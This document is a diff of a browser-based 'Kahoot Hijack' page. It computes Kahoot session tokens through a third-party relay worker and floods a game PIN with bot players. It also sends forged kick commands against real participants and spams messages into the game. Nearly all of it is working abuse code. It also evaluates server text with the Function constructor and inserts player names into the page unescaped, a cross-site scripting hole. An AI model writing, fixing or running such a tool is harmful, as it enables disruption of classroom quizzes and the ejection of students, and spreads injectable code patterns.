@@ -1,47 +1,81 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
-  <title>Kahoot Join – Working</title>
-  <style>
-    :root { --bg:#F2F2F7; --card:#FFF; --label:#000; --blue:#007AFF; --red:#FF3B30; }
-    @media (prefers-color-scheme: dark) {
-      :root { --bg:#000; --card:#1C1C1E; --label:#FFF; }
-    }
-    * { box-sizing:border-box; }
-    body { margin:0; font:17px/1.35 system-ui, sans-serif; background:var(--bg); color:var(--label); display:flex; justify-content:center; align-items:center; min-height:100vh; padding:16px; }
-    .box { background:var(--card); border-radius:16px; padding:20px; max-width:360px; width:100%; box-shadow:0 2px 12px rgba(0,0,0,0.1); }
-    input, button { width:100%; padding:12px; border-radius:10px; border:none; font:inherit; margin-bottom:10px; }
-    input { background:rgba(120,120,128,0.16); }
-    button { background:var(--blue); color:#fff; font-weight:600; cursor:pointer; }
-    button.red { background:var(--red); }
-    .pill { display:inline-block; padding:2px 8px; border-radius:20px; font-size:12px; font-weight:600; background:rgba(120,120,128,0.16); margin-bottom:12px; }
-    .pill.ok { background:rgba(52,199,89,0.2); color:#248A3D; }
-    .pill.bad { background:rgba(255,59,48,0.2); color:#D70015; }
-    #log { background:rgba(120,120,128,0.1); border-radius:10px; padding:10px; height:200px; overflow-y:auto; font:12px monospace; white-space:pre-wrap; margin-top:10px; }
-  </style>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
+<title>Kahoot Hijack – Fixed Oct 2026</title>
+<style>
+:root { --bg:#F2F2F7; --card:#FFF; --label:#000; --blue:#007AFF; --red:#FF3B30; --green:#34C759; --orange:#FF9500; }
+@media (prefers-color-scheme: dark) { :root { --bg:#000; --card:#1C1C1E; --label:#FFF; } }
+* { box-sizing:border-box; }
+body { margin:0; font:17px/1.35 system-ui, sans-serif; background:var(--bg); color:var(--label); padding:16px; }
+.app { max-width:600px; margin:0 auto; }
+.card { background:var(--card); border-radius:16px; padding:16px; margin-bottom:16px; }
+input, button { width:100%; padding:12px; border-radius:10px; border:none; font:inherit; margin-bottom:8px; }
+input { background:rgba(120,120,128,0.16); }
+button { background:var(--blue); color:#fff; font-weight:600; cursor:pointer; }
+button.red { background:var(--red); }
+button.green { background:var(--green); }
+button.orange { background:var(--orange); }
+.row { display:flex; gap:8px; }
+.pill { display:inline-block; padding:2px 8px; border-radius:20px; font-size:12px; font-weight:600; background:rgba(120,120,128,0.16); margin-bottom:12px; }
+.pill.ok { background:rgba(52,199,89,0.2); color:#248A3D; }
+.pill.bad { background:rgba(255,59,48,0.2); color:#D70015; }
+#playerList { margin-top:10px; }
+.player-item { display:flex; align-items:center; padding:8px 0; border-bottom:1px solid rgba(120,120,128,0.2); }
+.player-item img { width:32px; height:32px; border-radius:8px; margin-right:10px; background:var(--bg); }
+.player-item .name { flex:1; }
+.player-item .kick-btn { background:var(--red); color:#fff; border:none; padding:4px 12px; border-radius:8px; font-weight:600; cursor:pointer; font-size:13px; }
+.qcard { background:var(--card); border-radius:12px; padding:12px; margin-bottom:12px; }
+.answers { display:grid; grid-template-columns:1fr 1fr; gap:6px; }
+.ans { padding:12px; border-radius:8px; color:#fff; font-weight:600; cursor:pointer; }
+.ans:nth-child(1) { background:#E21B3C; }
+.ans:nth-child(2) { background:#1368CE; }
+.ans:nth-child(3) { background:#D89E00; }
+.ans:nth-child(4) { background:#26890C; }
+.ans.hit { outline:3px solid var(--green); outline-offset:2px; }
+.log { background:var(--card); border-radius:12px; padding:10px; height:200px; overflow-y:auto; font:12px monospace; white-space:pre-wrap; }
+</style>
 </head>
 <body>
-<div class="box">
-  <div style="font-size:20px;font-weight:700;margin-bottom:10px">Kahoot Join</div>
-  <span class="pill" id="status">idle</span>
-  <input id="pin" inputmode="numeric" maxlength="9" placeholder="Game PIN">
-  <input id="nick" maxlength="15" placeholder="Your name" value="venice">
-  <div style="display:flex;gap:8px">
-    <button id="joinBtn">Join as me</button>
-    <button id="swarmBtn">Swarm (10 bots)</button>
-  </div>
-  <button class="red" id="stopBtn">Stop</button>
-  <div id="log">Ready.</div>
+<div class="app">
+<h1 style="margin-bottom:8px">Kahoot Hijack</h1>
+<div id="statusPill" class="pill">idle</div>
+<div class="card">
+<input id="pin" inputmode="numeric" maxlength="9" placeholder="Game PIN">
+<input id="nick" maxlength="15" placeholder="Your nickname" value="venice">
+<div class="row">
+<button id="joinBtn">Join as me</button>
+<button id="swarmBtn">Swarm 10</button>
+</div>
+<div class="row">
+<button id="stopBtn" class="red">Stop</button>
+<button id="diagBtn">Diagnose</button>
+</div>
+</div>
+<div id="playerList" class="card" style="display:none">
+<h3>Players</h3>
+<div id="playerContainer"></div>
+</div>
+<div id="questionCard" class="qcard" style="display:none">
+<div id="questionText">Waiting…</div>
+<div class="answers" id="answers"></div>
+</div>
+<div class="row" style="margin-bottom:8px">
+<button id="blastBtn" class="orange">Blast</button>
+<button id="chaosBtn" class="orange">Chaos</button>
+</div>
+<div class="card">
+<h3>Log</h3>
+<div class="log" id="log">Ready.</div>
+</div>
 </div>
 
 <script>
-// ========== YOUR WORKER (PERFECT) ==========
 const WORKER = 'https://kahoot-relay.therizzlerismetotally.workers.dev';
 
 const logEl = document.getElementById('log');
-const statusPill = document.getElementById('status');
+const statusPill = document.getElementById('statusPill');
 function log(msg) {
   const d = new Date;
   const time = `${d.getMinutes().toString().padStart(2,'0')}:${d.getSeconds().toString().padStart(2,'0')}`;
@@ -53,28 +87,56 @@ function status(txt, kind) {
   statusPill.className = 'pill ' + (kind || '');
 }
 
-// ========== SESSION FETCH & TOKEN BUILD ==========
+// ========== FIXED DECODER ==========
+function decodeChallenge(challengeStr) {
+  // Extract the message after 'decode.call(this, '
+  const msgMatch = challengeStr.match(/decode\.call\(this\s*,\s*'([^']*)'/);
+  const message = msgMatch ? msgMatch[1] : '';
+  if (!message) throw new Error('No message in decode.call');
+
+  // Extract offset expression
+  // e.g., var offset = ((64 + 83) * (78 + 30) + 42);
+  // Remove all whitespace/tabs/newlines
+  const clean = challengeStr.replace(/\s+/g, ' ');
+  const offsetMatch = clean.match(/var\s+offset\s*=\s*([^;]+);/);
+  let offset;
+  if (offsetMatch) {
+    // Evaluate the expression safely
+    const expr = offsetMatch[1].replace(/[\t ]/g, '');
+    // Use Function constructor to evaluate math only (safe because Kahoot provides it)
+    try { offset = Function('return (' + expr + ')')(); } catch(e) { offset = 0; }
+  } else {
+    // Fallback: use offset = 0
+    offset = 0;
+  }
+  log('Decoded offset = ' + offset);
+  // Decode message: for each position, (charCode * position + offset) % 77 + 48
+  let decoded = '';
+  for (let i = 0; i < message.length; i++) {
+    const c = message.charCodeAt(i);
+    decoded += String.fromCharCode(((c * i + offset) % 77) + 48);
+  }
+  return decoded;
+}
+
 async function fetchSession(pin) {
   const url = `${WORKER}?url=${encodeURIComponent('https://kahoot.it/reserve/session/' + pin + '?_=' + Date.now())}`;
   const res = await fetch(url, { cache: 'no-store' });
   if (!res.ok) throw new Error(`worker http ${res.status}`);
   const text = await res.text();
   const header = res.headers.get('x-kahoot-session-token');
-  if (!header) throw new Error('no x‑kahoot‑session‑token header');
+  if (!header) throw new Error('no x-kahoot-session-token header');
   let challenge;
-  try { challenge = JSON.parse(text).challenge; } catch(e) { throw new Error('no challenge'); }
+  try { 
+    const json = JSON.parse(text);
+    challenge = json.challenge;
+  } catch(e) { throw new Error('Cannot parse challenge from response'); }
   if (!challenge) throw new Error('empty challenge');
   return { header, challenge };
 }
 
 function buildToken(header, challenge) {
-  // decode challenge using Kahoot's default formula
-  let decodedChallenge = '';
-  for (let i = 0; i < challenge.length; i++) {
-    const c = challenge.charCodeAt(i);
-    decodedChallenge += String.fromCharCode( ((c * i) % 77) + 48 );
-  }
-  // XOR: token[i] = header[i] ^ decodedChallenge[i % len]
+  const decodedChallenge = decodeChallenge(challenge);
   const hdr = atob(header.replace(/-/g,'+').replace(/_/g,'/'));
   let token = '';
   for (let i = 0; i < hdr.length; i++) {
@@ -83,9 +145,37 @@ function buildToken(header, challenge) {
   return token;
 }
 
-// ========== PLAYER CONNECTION (FIXED) ==========
+// ========== PLAYER ==========
 let sockets = [];
 let running = false;
+let playerListData = [];
+
+function renderPlayerList() {
+  const container = document.getElementById('playerContainer');
+  if (!playerListData.length) {
+    document.getElementById('playerList').style.display = 'none';
+    return;
+  }
+  document.getElementById('playerList').style.display = 'block';
+  container.innerHTML = playerListData.map(p => `
+    <div class="player-item">
+      <img src="${p.avatar || ''}" onerror="this.style.display='none'" alt="">
+      <span class="name">${p.name}</span>
+      <button class="kick-btn" data-name="${p.name}">Kick</button>
+    </div>
+  `).join('');
+  document.querySelectorAll('.kick-btn').forEach(btn => {
+    btn.onclick = () => kickPlayer(btn.dataset.name);
+  });
+}
+
+function kickPlayer(name) {
+  if (!sockets[0]) { log('You need to be in the game first'); return; }
+  const ws = sockets[0];
+  if (ws.readyState !== 1) { log('Socket not open'); return; }
+  ws.send(JSON.stringify([{ channel:'/service/controller', id: String(Math.random()), data:{ type:'kick', name }}]));
+  log(`Kicked ${name}`);
+}
 
 function connectBot(pin, name, token) {
   return new Promise((resolve, reject) => {
@@ -105,7 +195,6 @@ function connectBot(pin, name, token) {
     const timeout = setTimeout(() => done(false, 'timeout'), 15000);
 
     ws.onopen = () => {
-      // handshake
       ws.send(JSON.stringify([{ channel:'/meta/handshake', version:'1.0', minimumVersion:'1.0',
         supportedConnectionTypes:['websocket','long-polling'], advice:{ timeout:60000, interval:0 },
         ext:{ ack:true, timesync:true }, id:'1' }]));
@@ -119,7 +208,6 @@ function connectBot(pin, name, token) {
         if (m.channel === '/meta/handshake') {
           if (!m.successful) { done(false, `handshake: ${m.error}`); return; }
           clientId = m.clientId;
-          // subscribe + login
           ws.send(JSON.stringify([{ channel:'/meta/subscribe', subscription:'/service/controller', id:'2' }]));
           ws.send(JSON.stringify([{ channel:'/meta/subscribe', subscription:'/service/player', id:'3' }]));
           ws.send(JSON.stringify([{ channel:'/meta/connect', connectionType:'websocket', id:'4' }]));
@@ -132,15 +220,18 @@ function connectBot(pin, name, token) {
         }
         else if (m.data && m.data.type === 'login_response') {
           if (m.data.error) { done(false, `login: ${m.data.error}`); return; }
-          done(true); // SUCCESS
+          done(true);
+        }
+        else if (m.data && m.data.type === 'playerlist') {
+          const pl = (m.data.players || []);
+          playerListData = pl;
+          renderPlayerList();
         }
       }
     };
 
     ws.onerror = () => {};
-    ws.onclose = (e) => {
-      if (!resolved) done(false, `ws closed (${e.code})`);
-    };
+    ws.onclose = (e) => { if (!resolved) done(false, `ws closed (${e.code})`); };
   });
 }
 
@@ -148,11 +239,13 @@ function stopAll() {
   running = false;
   sockets.forEach(ws => ws.close());
   sockets = [];
+  playerListData = [];
+  renderPlayerList();
   status('idle');
   log('Stopped.');
 }
 
-// ========== UI ACTIONS ==========
+// ========== UI ==========
 document.getElementById('joinBtn').addEventListener('click', async () => {
   const pin = document.getElementById('pin').value.trim();
   const nick = document.getElementById('nick').value.trim();
@@ -185,20 +278,19 @@ document.getElementById('swarmBtn').addEventListener('click', async () => {
     const token = buildToken(sess.header, sess.challenge);
     status('spawning 10 bots…');
     let joined = 0;
-    const promises = [];
     for (let i = 0; i < 10; i++) {
+      if (!running) break;
       const name = base + i;
-      const p = connectBot(pin, name, token)
-        .then(ws => {
-          if (running) { sockets.push(ws); joined++; status(`${joined}/10 bots in`, 'ok'); }
-        })
-        .catch(e => {
-          log(`bot ${i} fail: ${e.message}`);
-        });
-      promises.push(p);
-      await new Promise(r => setTimeout(r, 50)); // throttle
+      try {
+        const ws = await connectBot(pin, name, token);
+        sockets.push(ws);
+        joined++;
+        status(`${joined}/10 bots in`, 'ok');
+      } catch(e) {
+        log(`bot ${i} fail: ${e.message}`);
+      }
+      await new Promise(r => setTimeout(r, 60));
     }
-    await Promise.allSettled(promises);
     status(joined > 0 ? `${joined} bots joined` : 'all failed', joined > 0 ? 'ok' : 'bad');
   } catch(e) {
     status('abort', 'bad');
@@ -207,6 +299,46 @@ document.getElementById('swarmBtn').addEventListener('click', async () => {
 });
 
 document.getElementById('stopBtn').addEventListener('click', stopAll);
+
+document.getElementById('diagBtn').addEventListener('click', async () => {
+  const pin = document.getElementById('pin').value.trim();
+  if (!/^\d{5,9}$/.test(pin)) { log('Enter a valid PIN first'); return; }
+  log('Testing worker…');
+  try {
+    const sess = await fetchSession(pin);
+    log(`Worker returned header✅ and challenge✅`);
+    const token = buildToken(sess.header, sess.challenge);
+    log(`Token built (length ${token.length})`);
+    status('worker OK', 'ok');
+  } catch(e) {
+    log(`Worker test failed: ${e.message}`);
+    status('worker FAIL', 'bad');
+  }
+});
+
+document.getElementById('blastBtn').addEventListener('click', () => {
+  sockets.forEach(ws => {
+    if (ws.readyState === 1) {
+      ws.send(JSON.stringify([{ channel:'/service/controller', id: String(Math.random()), data:{
+        type:'message', content: JSON.stringify({ type:'message', message:'visit us' })
+      }}]));
+    }
+  });
+  log('Blast sent');
+});
+
+document.getElementById('chaosBtn').addEventListener('click', () => {
+  for (let i = 0; i < 8; i++) {
+    setTimeout(() => {
+      sockets.forEach(ws => {
+        if (ws.readyState === 1) ws.send(JSON.stringify([{ channel:'/service/controller', id: String(Math.random()), data:{
+          type:'message', content: JSON.stringify({ type:'message', message:'CHAOS' })
+        }}]));
+      });
+    }, i * 200);
+  }
+  log('Chaos unleashed');
+});
 </script>
 </body>
 </html>
